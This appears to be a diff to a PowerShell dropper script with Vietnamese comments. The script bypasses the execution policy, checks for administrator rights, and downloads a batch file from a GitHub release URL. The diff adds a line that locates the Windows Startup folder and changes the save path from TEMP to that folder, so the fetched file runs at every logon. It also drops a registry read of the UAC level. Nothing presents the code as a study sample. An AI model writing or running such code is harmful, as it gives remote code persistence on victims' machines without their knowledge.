@@ -4,7 +4,7 @@
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
-
+$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
 
 $skid = "skid"
 
@@ -13,11 +13,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     try {
         # Tải xuống tệp batch
         
-        $outputFile = "$env:TEMP\download.bat"
-        
-        # Thực thi tệp batch mà không cần quyền quản trị
-        # Lấy mức độ thông báo UAC từ registry
-        $uacLevel = Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" | Select-Object -ExpandProperty "ConsentPromptBehaviorAdmin"
+        $outputFile = "$startupfolder\download.bat"
         
         # Kiểm tra mức độ UAC và in thông báo
         $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
